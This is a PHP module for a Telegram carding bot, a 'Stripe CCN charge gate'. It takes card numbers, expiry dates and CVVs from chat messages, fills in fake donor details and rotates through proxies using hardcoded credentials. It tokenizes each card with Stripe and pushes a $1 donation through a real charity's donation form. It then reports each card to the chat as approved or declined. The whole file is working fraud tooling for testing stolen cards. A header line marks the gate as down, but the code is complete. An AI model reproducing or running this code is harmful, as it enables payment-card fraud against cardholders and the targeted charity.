<?php

#----------------------------------------------------------------------#
#   GATE: STRIPE CCN CHARGE (AMOUNT = $1 CAD)                          #
#   SITE: https://lifecollective.io/lifecanada/donate                  #
#----------------------------------------------------------------------#
$gate = "STRIPE CCN CHARGE ($C CAD)";



if ((strpos($message, "/ccn") === 0) || (strpos($message, "!ccn") === 0)){
    sendMessage($chatId, "Gate is Down for Sometime..!!%0APlease ask Owner To update the gate @SWDQYL", $message_id);
    exit;


# EXPIRED - SITE DEAD

  
  if (in_array($userId, $premium_users) === false){
 	sendMessage($chatId,$premium_unauth_msg, $message_id);
	return;
	}
  
  
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    };
  
function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };


$lista = substr($message, 4);
    $amount = multiexplode(array("*"), $lista)[1];
        preg_match_all('!\d+!', $amount, $amot);
        $amt = $amot[0][0];;
    if($amt > 50) { $amt = "50"; }
    if($amt < 1) { $amt = "1"; }
  
$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
  
$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1;   }

if (strlen($ano) == 2) $ano = "20$ano";
if (strlen($mes) == 1) $mes = "0$mes";

//$first6 = substr($cc, 0, 6);
//$last4 = substr($cc, 12, 4);
$lista = "$cc|$mes|$ano|$cvv";




//==================[BIN LOOK-UP]======================//

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$type = $binna['type'];
$level = $binna['category'];
$country = $binna['country']['name'];
$emoji = $binna['country']['emoji'];
$bank = $binna['bank']['name'];
curl_close($ch);

$bindata1 = " $bin - $brand - $type - $level - $bank - $country($emoji)";
curl_close($ch);


//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
  
$data1 = "$name - $last - $email - $phone - urlencode($street) - '.urlencode($city).' - $state - $postcode";


//=======================[Proxys]=============================//
$Websharegay = rand(0,250);
$rp1 = array(
  	//1 => 'krmcyqke-rotate:9kanicwn8thd',
  	1 => 'lookdvnz-rotate:mms1x3cqscnm',
  	2 => 'gpwaqrjb-rotate:tv6dlsbhyywo',
  	3 => 'vhpfjxsx-rotate:xmzs8124xvqg',
  	4 => 'zhtwglvf-rotate:8okrq6e9k62o',
    ); 
    $rotate = $rp1[array_rand($rp1)];
////==============[Proxy Section]===============////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead! ❌";
}


//=======================[0 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://lifecollective.io/lifecanada/donate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: lifecollective.io',
'method: GET',
'path: /lifecanada/donate',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: none',
'sec-fetch-user: ?1',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36',
   ));

$result = curl_exec($ch);
$csrf = trim(strip_tags(GetStr($result, 'name="csrf-token" content="','"')));
$csrf1 = urlencode($csrf);

//=======================[1 REQ]==================================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=3789'.rand(01,99).'&pasted_fields=number&guid=c215ad45-4e49-48ca-bfbb-9b5dc76f4c78ce0485&muid=2fffc0eb-b40c-4a36-b683-b7cb2527b4b1d77144&sid=61668808-0afa-4fa4-aad5-52ff30c82235314272&key=pk_live_7dG9MnDYLPK5kQZOTNk5kNYX&payment_user_agent=stripe.js%2F308cc4f&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');

 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 curl_close($ch);


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://lifecollective.io/2/donate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: lifecollective.io',
'method: POST',
'path: /2/donate',
'scheme: https',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: _ga=GA1.2.2041080800.1638732396; _gid=GA1.2.1947758885.1638732396; __stripe_mid=2fffc0eb-b40c-4a36-b683-b7cb2527b4b1d77144; _lifehub_sessions=NVFRNXcxbVRMZEkxOE11em9UUW1teXU0T1NCUWF0MHZkTWpiOE9JeE4xS3UrcFpNMHRxa3ArV2VSaS9hdUMrajVCdUZTMDBaVnRsMzJlZzNuTmhiMzdHZ0NrSVh6OGdnYXB6TXFZRk1tUjZ3TG9ybVMvbW5Pc1BRZVlZcWlueklHTTUwcG9BTzFrazdGelh4RXpwT2pnPT0tLUpnQlJuQ1U4aEU3aS9YWC9NNnd0R1E9PQ%3D%3D--b9bb8b2d6000b5678aa0115264777cb232b07692; __atuvc=2%7C49; __atuvs=61ad4ab1d3a89dfd000; __stripe_sid=dd673764-3e0a-4e2c-b222-378628c87bcf9070a2',
'origin: https://lifecollective.io',
'referer: https://lifecollective.io/lifecanada/donate',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36',
'x-csrf-token: '.$csrf.'',
'x-requested-with: XMLHttpRequest',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token='.$csrf1.'&donation_amt=1&is_subscription=0&fname='.$name.'&lname='.$last.'&phone='.$phone.'&email='.$name.''.rand(01,50).'%40gmail.com&comment=&country=US&street='.urlencode($street).'&city='.urlencode($city).'&province='.urlencode($state).'&postal_code='.$postcode.'&stripeToken='.$id.'');

$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'"messages":"','"')));
//$exp_msg = trim(strip_tags(getStr($result2,'"exceptionMessage":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);


//==================[Responses]======================//

if ((strpos($result2, 'Thank you for your donation'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞/𝐂𝐂𝐍 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Thank you for your donation!   [ CCN Charged 1$ ]</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}

elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞/𝐂𝐂𝐍 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>APPROVED!</b> ✅%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>CCN has Low funds.</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}



elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number')) || (strpos($result1, 'incorrect_number'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞/𝐂𝐂𝐍 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Your card number is incorrect.</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}

elseif ((strpos($result2, "generic_decline")) || (strpos($result1, "generic_decline"))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞/𝐂𝐂𝐍 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Generic declined.</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}

elseif ((strpos($result2, 'The card has expired.')) || (strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card')) || (strpos($result1, 'expired_card'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞/𝐂𝐂𝐍 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Your card has expired.</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}

elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed")) || (strpos($result1, "transaction_not_allowed"))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞/𝐂𝐂𝐍 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Your CCN not support this type of purchase.</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}

elseif ((strpos($result2, "card_declined")) || (strpos($result1, 'card_declined.')) || (strpos($result1, 'Your card was declined.')) || (strpos($result2, 'Your card was declined.'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞/𝐂𝐂𝐍 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>Your card was declined.</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}

elseif ((strpos($result2, "Internal Error")) || (strpos($result1, "Internal Error"))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞/𝐂𝐂𝐍 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>DECLINED!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>The payment method was invalid!</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}


elseif (strpos($result2, '-1')){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞/𝐂𝐂𝐍 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>Error!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>(-1) Error_Reporting.</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}

else{
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -⪼</b> 𝐒𝐭𝐫𝐢𝐩𝐞/𝐂𝐂𝐍 𝐂𝐡𝐚𝐫𝐠𝐞 (𝟏$) <b>♻️</b>%0A%0A𝙲𝚊𝚛𝚍 ➺ <i><code>'.$lista.'</code>%0A</i>𝚂𝚝𝚊𝚝𝚞𝚜 ➺ <b>Error!</b> ❌%0A𝚁𝚎𝚜𝚞𝚕𝚝 ➺ <b>'.urlencode($result2).'</b>%0A<a>⋙ ════════ ⋆★⋆ ════════ ⋘%0A</a>𝐁𝐢𝐧 𝐃𝐚𝐭𝐚 ➺ <i><code>'.$bindata1.'</code></i>%0A%0A%0A<b>𝙿𝚛𝚘𝚡𝚢: </b><i>'.$ip.'%0A</i><b>𝚃𝚒𝚖𝚎 𝚝𝚊𝚔𝚎𝚗: </b><i>'.$time.'s%0A</i><b>𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝚋𝚢: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>𝙱𝚘𝚝 𝙼𝚊𝚍𝚎 𝚋𝚢:</b><a> [raven_ccs]</a>', $message_id);
}


curl_close($ch);
unlink("cookies.txt");
}

//====================[Stripe CCN Charge]=====================//

?>